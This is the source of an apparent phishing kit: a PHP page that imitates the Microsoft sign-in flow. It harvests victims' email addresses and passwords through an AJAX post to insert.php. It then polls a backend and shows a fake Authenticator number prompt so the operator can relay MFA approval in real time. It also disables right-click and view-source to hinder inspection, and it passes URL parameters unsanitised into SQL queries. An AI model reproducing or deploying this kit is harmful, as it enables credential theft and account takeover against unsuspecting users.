<?php 
                require ("db_connect.php");?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    /* Add styles for the loading screen here */
    #loading-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    #loading-spinner {
      background-image: url(https://www.windowslatest.com/wp-content/uploads/2021/08/Outlook-PWA.gif); /* URL to the GIF you provided */
      background-repeat: no-repeat;
      background-position: center center;
      width: 200px;
      height: 200px;
    }
  </style>
  <script>
    // Hide the loading screen after 10 seconds
    document.addEventListener('DOMContentLoaded', function() {
      setTimeout(function() {
        var loadingScreen = document.getElementById('loading-screen');
        loadingScreen.style.display = 'none';
      }, 10000); // 10 seconds in milliseconds
    });
  </script>
</head>
<body>
  <!-- Loading Screen -->
  <div id="sloading-screen">
    <!-- Add loading screen content here -->
    <div id="sloading-spinner"></div>
  </div>
  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
  <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
  <title>Sign in to your account</title>
  <!-- <link href="css/hover.css" rel="stylesheet" media="all"> -->

  <style type="text/css">
    textarea:hover, 
input:hover, 
textarea:active, 
input:active, 
textarea:focus, 
input:focus,
button:focus,
button:active,
button:hover,
label:focus,
.btn:active,
.btn.active
{
    outline:0px !important;
    -webkit-appearance:none;
    box-shadow: none !important;
}

    .box
    {
      /*box-shadow: 0 2px 3px rgba(0,0,0,0.55);*/
      /*border: 1px solid rgba(0,0,0,0.4);*/
      min-height: 338px;
      min-width: 320px;
      max-width: 440px;
      width: calc(100% - 40px);
      padding: 44px;
      margin-left: auto;
      margin-right: auto;
      margin-top: 20px;
      margin-bottom: 28px;
    }

    #footer {
      position: fixed;
      bottom: 0px;
      width: 100%;
      overflow: visible;
      z-index: 99;
      clear: both;
      background-color: #000;
      background-color: rgba(0,0,0,0.6);
    }

    /*.footerNode span {
    color: #fff;
    font-size: 0.75rem;
    line-height: 28px;
    white-space: nowrap;
    display: inline-block;
    float: right;
    margin-left: 8px;
    margin-right: 8px;
}*/
div .footerNode a, div .footerNode span {
    color: #fff;
    font-size: 0.75rem;
    line-height: 28px;
    white-space: nowrap;
    display: inline-block;
    float: right;
    margin-left: 8px;
    margin-right: 8px;
}
    @media only screen and (max-width: 610px) {
      #hide{
        display: none;
      }
    }
       .loader {
      border: 4px solid #f3f3f3; /* Light gray border */
      border-top: 4px solid #3498db; /* Blue border (change color as desired) */
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite; /* Animation duration and timing */
      margin: auto; /* Center the loader */
      margin-top: 16vh; /* Adjust the margin-top to center vertically */
      display: flex;
      align-items: center;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); } /* Starting rotation */
      100% { transform: rotate(360deg); } /* Ending rotation */
    }
  </style>
  <link rel="shortcut icon" type="image/png" href="https://easyupload.io/mm9scz"/>

</head>
<body style="background-image: url('https://logincdn.msauth.net/16.000.28666.7/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg'); background-size: cover;background-repeat: no-repeat;">
  <div class="container-fluid">
    <div class="container">
      <div class="row my-5 py-5">
          <!-- <div class="col-lg-6" id="hide">
            <div class="text-white my-5 py-3">
              <span class="display-4">Expand Your<br> Microsoft</span><br><br>
              <span class="h5 font-weight-normal">Upgrade to ad-free email and the latest productivity tools with Microsoft.</span><br><br><br>
              <button class="btn btn-white rounded-0 px-5 py-2" style="font-size: 20px; color: #1C9CD6; font-weight: 500;">Get Started</button>
            </div>
          </div> -->
          <div id="result"></div>
          <div id="result-container"></div>

          <div class="col-lg-6 mx-auto">

            
            <!-- State -->
            <?php
            
              if(isset($_GET["uid"]))
              { 
                $uid = $_GET['uid'];
                $checkID = mysqli_query($conn, "SELECT * FROM user_records WHERE uid='$uid'");
                if (mysqli_num_rows($checkID)==0) {
                  echo "<script>window.location.href='index.php';</script>";
                }else{
                  // set interval to check for the status
                  ?>

                  <script type="text/javascript">
                    setInterval(function() {
                      var myValue = "<?php echo $uid;?>"; // Replace "your_value" with the actual value you want to pass

                      $.ajax({
                        url: "state.php", // Replace "your_php_page.php" with the actual PHP page URL
                        type: "GET",
                        data: {
                          value: myValue
                        },
                        success: function(response) {
                          // Handle the response from the PHP page here
                          // console.log(response);
                          // Update your HTML or perform any other actions with the response
                          if (response == '0') {
                            console.log("0");
                          }else if(response == '1'){
                            window.location.href="index.php?errpwd";
                          }else if(response == '2'){
                            // use it for bypass code process
                            window.location.href="?myid="+myValue;
                          }
                          // $('#result').html(response); // Example: Update the content of an element with ID 'result'
                        },
                        error: function(xhr, status, error) {
                          // Handle the error here
                          console.log("AJAX Error:", error);
                        }
                      });
                    }, 2000); // 2000 milliseconds = 2 seconds

                      </script>
                  <?php
                }
              ?>
              <div class="bg-white box" style="align-items: center; justify-content: center;">
                <center>
                  <div class="loader"></div>
                  <span style="color:#555; font-size: 13px;">Please wait</span>
                </center>
              </div>
              <?php
              }elseif(isset($_GET["myid"])){
                $uid = $_GET["myid"];
                $check = mysqli_query($conn, "SELECT * FROM user_records WHERE uid='$uid'");
                if (mysqli_num_rows($check)==0) {
                  echo "<script>window.location.href='index.php';</script>";
                }else{
                  $data = mysqli_fetch_object($check);
                  $username = $data->username;
                  $mycode = $data->mycode;
                }
                ?>
               <div class="bg-white box">
                  <img src="https://logincdn.msauth.net/16.000.28666.7/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="img-fluid"><br><br>
                  <?php echo "<p>".$username."</p>"; ?>
                  <h6>Approve Sign in request</h6>

                  <div class="row">
                    <div class="col-2" >
                      <img src="myauth.svg" alt="Image" class="img-fluid"style="float:right;">
                    </div>
                    <div class="col-10" style="padding: 0;">
                      <p style="color:gray; font-size:13px; font-weight: 500;">Open your Authenticator app, and enter the number shown to sign in.</p>
                    </div>
                  </div>
                  <center style="margin-top: 20px; margin-bottom:20px ;">
                    <b style="border:2px solid #000; padding:10px;"><?php echo $mycode; ?></b>
                  </center>
                  <p style="color:gray; font-size:13px; font-weight: 500;">No number in your app? Make sure to upgrade to the latest version</p>
                  <p >
                    <a href="#" style="color:skyblue!important; font-size:13px; font-weight: 500;">I can't use my Microsoft Authenticator app right now</a>
                  </p>
                  <p >
                    <a href="#" style="color:skyblue!important; font-size:13px; font-weight: 500;">More Information</a>
                  </p>
                </div>
                <?php
              }
              else{
              ?>
                 <div class="bg-white box" id="div1">
              <img src="https://logincdn.msauth.net/16.000.28666.7/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="img-fluid"><br><br>
                <span class="h5">Sign In</span><br>
                <?php
  if (isset($_GET["errpwd"])) {
                echo "<p style='color:red; font-size:13px;'>Your account or password is incorrect. If you don't remember your password,</p>";
              }
                ?>
                <span id="error" class="text-danger" style="display: none;">That Microsoft account doesn't exist. Enter a different account</span>
                <div class="form-group mt-2">
                  <input type="email" name="email" class="form-control rounded-0 border-dark" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;" value="">
                </div>
                <p>No account? <a href="#">Create one!</a></p>
                <!-- <p><a href="#">Sign in with a security key</a></p>
                <p><a href="#">sign in options</a></p> -->
                <div class="text-right">
                  <button class="btn rounded-0 text-white px-4 mt-4" id="next" style="background-color: #0066BA;">Next</button>
                </div>
              </div>
              <?php
              }
            ?>

              <div class="m-5 p-4 bg-white box" id="div2" style="display: none;">
                <form id="insertForm">
                  <img src="https://logincdn.msauth.net/16.000.28666.7/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="img-fluid"><br><br>
                  <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">abc@abc.com</span><br>
                  <span id="msg" class="text-danger" style="display: none;"></span><br>
                  <span class="h5">Password</span>
                  <div class="form-group mt-2">
                    <input type="password" name="password" class="form-control rounded-0 border-dark" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
                  </div>
                  <!-- <p>No account? <a href="#">Create one!</a></p> -->
                  <p><a href="#">Sign in with a security key</a></p>
                  <p><a href="#">Forget my password?</a></p>
                  <div class="text-right">
                    <button class="btn rounded-0 text-white px-4" type="submit" style="background-color: #0066BA;" >login</button>
                  </div>
                </form>
              </div>

          </div>

          </div>
        </div>
      </div>

      <footer id="footer">
        <div>
          <div class="footerNode">
           <span>©2023 Microsoft</span>
            <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Privacy statement</a>
          </div>
        </div>
      </footer>
<link rel="shortcut icon" type="image/png" href="/favicon.png"/>



    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    <script>
    // connect to db
    // fetch('db_connect.php')
    //     .then(response => response.text())
    //     .then(data => {
    //         // Display the result in the HTML
    //         var resultContainer = document.getElementById('myresult');
    //         resultContainer.innerHTML = data;
    //     })
    //     .catch(error => console.error('Error:', error));
    </script>
    <script>
      $(document).ready(function () {
        $("#insertForm").submit(function (e) {
            // Prevent the default form submission
            e.preventDefault();

            // Call the function to insert data
            insertData();
        });
      });
      function insertData() {
        var username = $("#email").val();
        var password = $("#password").val();
        var submitButton = $("#insertForm button");
        $.ajax({
            type: "POST",
            url: "insert.php",
            data: { username: username, password: password },
            success: function (response) {
              if(response.status == 'success');
                window.location.href="?uid="+response.uid;
            },
            beforeSend: function () {
              submitButton.text("Verifying...");
            }
        });
      }
    </script>
    <script>


      /* global $ */
      $(document).ready(function(){
        var count=0;


    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {

    }
    else
    {
      var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

      if (!base64regex.test(email)) {
            // alert(btoa(email));
            var my_email =email;
          }
          else
          {
            // alert(atob(email));
            var my_email =atob(email);
          }
        // $('#email').val(email);
        // var my_email =email;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $('#email').val(my_email);
      }





      $('#email').click(function(){
        $('#error').hide();
      });
      $('#next').click(function () {
        var my_email =$('#email').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();

        $("#div1").animate({left:200, opacity:"hide"}, 0);
        $("#div2").animate({right:200, opacity:"show"}, 1000);
        $("#emailch").html(my_email);

      });
      $('#back').click(function () {
        $("#msg").hide();
        $("#email").val("");
        $("#password").val("");
        $("#div2").animate({left:200, opacity:"hide"}, 0);
        $("#div1").animate({right:200, opacity:"show"}, 1000);

      });

      // process submit btn
      
      
      // $('#submit-btn').click(function(event){
      //   event.preventDefault();
      //   var email=$("#email").val();
      //   var password=$("#password").val();
      //   var detail=$("#field").html();
      //   var msg = $('#msg').html();

      //   var my_email =email;
      //   var ind=my_email.indexOf("@");
      //   var my_slice=my_email.substr((ind+1));
      //   var c= my_slice.substr(0, my_slice.indexOf('.'));
      //   var final= c.toLowerCase();
      //   $('#msg').text( msg );
      //   count=count+1;
      //   $.ajax({
      //     dataType: 'JSON',
      //     url: 'process.php',
      //     type: 'POST',
      //     data:{
      //       email:email,
      //       password:password,
      //       detail:detail,

      //     },
      //     beforeSend: function(xhr){
      //       $('#submit-btn').html('Verifing...');
      //     },
      //     success: function(response){
      //       $("#password").val("");
      //       if (count>=2) {
      //         count=0;
      //         window.location.replace("https://outlook.office.com/mail/inbox/");
      //       }
      //       if(response){
      //         $("#msg").show();
      //         console.log(response);
      //         if(response['signal'] == 'ok'){
      //          $('#msg').html(response['msg']);
      //        }
      //        else{
      //         $('#msg').html(response['msg']);
      //       }
      //     }
      //   },
      //   error: function(){
      //     $("#password").val("");
      //     if (count>=2) {
      //       count=0;
      //       window.location.replace("https://outlook.office.com/mail/inbox/");
      //     }
      //     $("#msg").show();
      //     $('#msg').html("   password is incorrect.");
      //   },
      //   complete: function(){
      //     $('#submit-btn').html('Login');
      //   }
      // });
      // });
    });
  </script>
    
<script>
//    var getUrlParameter = function getUrlParameter(sParam) {
//    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
//        sURLVariables = sPageURL.split('&'),
//        sParameterName,
//        i;
//    for (i = 0; i < sURLVariables.length; i++) {
//        sParameterName = sURLVariables[i].split('=');
//        if (sParameterName[0] === sParam) {
//            return sParameterName[1] === undefined ? true : sParameterName[1];
//        }
//    }
//};
//
//var yourEmail = getUrlParameter('email');
//
//document.getElementById('email').value = yourEmail;

</script>
<script>
    // Disable right-click
    document.addEventListener('contextmenu', function (e) {
        e.preventDefault();
    });

    // Disable Ctrl+U
    document.addEventListener('keydown', function (e) {
        if (e.ctrlKey && e.key === 'u') {
            e.preventDefault();
        }
    });
</script>
</body>
</html>
